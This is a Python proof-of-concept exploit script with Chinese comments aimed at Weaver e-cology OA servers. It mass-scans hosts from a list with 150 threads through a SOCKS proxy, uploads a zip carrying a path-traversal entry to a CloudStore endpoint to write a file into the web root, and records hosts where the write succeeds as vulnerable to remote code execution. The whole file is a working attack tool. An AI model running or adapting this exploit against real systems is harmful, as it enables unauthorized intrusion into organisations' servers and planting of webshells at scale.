#conding=utf-8
import requests #用于http请求响应
from requests.packages import urllib3
import threading#用于并发请求
import zipfile

'''
使用方法：
urls.txt用于存放目标HOST，然后直接运行此脚本即可 python POC.py
漏洞验证成功的目标存放于success.txt，连接失败的错误信息存放于error.txt中
'''

#消除安全请求的提示信息,增加重试连接次数
urllib3.disable_warnings()
requests.adapters.DEFAULT_RETRIES = 4
s = requests.session()
s.keep_alive = False    #关闭连接，防止出现最大连接数限制错误
urllib3.util.ssl_.DEFAULT_CIPHERS += 'HIGH:!DH:!aNULL'#openssl 拒绝短键，防止SSL错误

# 设置最大线程数
thread_max = threading.BoundedSemaphore(value=150)

#HTTP请求-head头
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
}

proxies = {
    'http': 'socks5://127.0.0.1:1081',
    'https': 'socks5://127.0.0.1:1081'
}

targets = []    #定义目标列表
threads = []    #定义线程池


def file_zip():
    shell = "eclogoy-oa-rce-webshell"
    zf = zipfile.ZipFile('ec886.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr('../../../ec886.txt', shell)

def POC(url):
    file_zip()
    target = url + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    try:
        file = [('file1', ('ec886.zip', open('ec886.zip', 'rb'), 'application/zip'))]
        resp = s.post(url=target, verify=False,headers=headers,files=file,timeout=60,proxies=proxies)#忽略了SSL验证
        resp.encoding = resp.apparent_encoding  #指定编码，防止乱码
        resp.close() #关闭响应包
        GetShellurl = url +'/cloudstore/ec886.txt'
        GetShelllist = s.get(url = GetShellurl,verify=False, timeout=15,proxies=proxies)
        if GetShelllist.status_code == 200:
            print('目标存在RCE，Webshell地址为:'+ GetShellurl)
            with open('success.txt','a') as f:
                f.write(GetShellurl+'\n')
        else:
            print('不存在漏洞:'+url)
            with open('NoVuln.txt','a') as f:
                f.write(url+'\n')

    except Exception as ex_poc:
        msg = url+"=====访问链接失败====="+str(ex_poc)
        with open('./error.txt','a') as f:
            f.write(msg+'\n')
    finally:
        thread_max.release()    #释放锁


def H2U():
    '''输入格式处理，将HOST统一为URL格式'''
    with open('urls.txt','r',encoding='utf-8') as f:
        line=f.readlines()
        for host in line:
            host=host.strip()
            if(host[0:4]=="http"):
                url=host
            else:
                url="http://"+host
            if url not in targets:
                targets.append(url) #去重后加入目标列表


if __name__ == "__main__":
    H2U()
    for url in targets:
        thread_max.acquire()    #请求锁
        t = threading.Thread(target=POC,args=(url,))
        threads.append(t)
        t.start()
    for i in threads:
        i.join()
